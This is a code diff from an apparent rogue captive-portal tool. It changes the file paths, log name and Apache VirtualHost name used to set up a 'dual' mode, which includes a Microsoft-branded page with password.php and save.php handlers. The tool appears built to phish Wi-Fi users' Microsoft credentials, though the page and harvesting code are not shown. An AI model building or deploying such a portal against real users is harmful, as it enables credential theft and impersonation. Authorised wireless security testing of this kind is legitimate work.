@@ -259,14 +259,14 @@ def setup_captive_portal_files_dual(Cap: str):
     try:
         print("[*] Copying portal files...")
         if Cap == "default":
-            shutil.copy("index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Dual/index.html", os.path.join(portal_dir, "index.html"))
+            shutil.copy("Dual/save.php", os.path.join(portal_dir, "save.php"))
         if Cap == "microsoft": 
-            shutil.copy("Microsoft/index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("Microsoft/password.php", os.path.join(portal_dir, "password.php"))
-            shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
-            shutil.copy("Microsoft/save2.php", os.path.join(portal_dir, "save2.php"))
-            shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
+            shutil.copy("Microsoft/Dual/index.html", os.path.join(portal_dir, "index.html"))
+            shutil.copy("Microsoft/Dual/password.php", os.path.join(portal_dir, "password.php"))
+            shutil.copy("Microsoft/Dual/save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Microsoft/Dual/save2.php", os.path.join(portal_dir, "save2.php"))
+            shutil.copy("Microsoft/Dual/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
         
         print("[+] Captive portal files copied successfully.")
     except Exception as e:
@@ -292,7 +292,7 @@ def setup_log_file():
         sys.exit(1)
 
 def setup_log_file_dual():
-    log_file = "/var/log/ca.log"
+    log_file = "/var/log/ca2.log"
     print(f"[*] Setting up log file {log_file}...")
     try:
         if not os.path.exists(log_file):
@@ -307,6 +307,7 @@ def setup_log_file_dual():
     except Exception as e:
         print(f"[-] Failed to set up log file: {e}")
         sys.exit(1)
+
 
 def create_vhost():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
@@ -421,7 +422,7 @@ def create_vhost_microsoft():
 
 
 def create_vhost_microsoft_dual():
-    vhost_file = "/etc/apache2/sites-available/captive.conf"
+    vhost_file = "/etc/apache2/sites-available/captive2.conf"
     print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
     vhost_content = r"""
